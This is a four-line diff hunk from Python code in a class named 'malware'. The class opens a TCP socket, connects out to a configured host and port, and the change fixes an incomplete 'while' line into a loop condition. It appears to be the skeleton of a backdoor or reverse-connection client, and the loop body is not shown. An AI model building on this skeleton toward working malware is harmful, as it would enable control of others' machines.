@@ -12,4 +12,4 @@ class malware:
     self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   def run(self):
     self.socket.connect((self.host,self.port))
-    while
+    while self.loop == True:
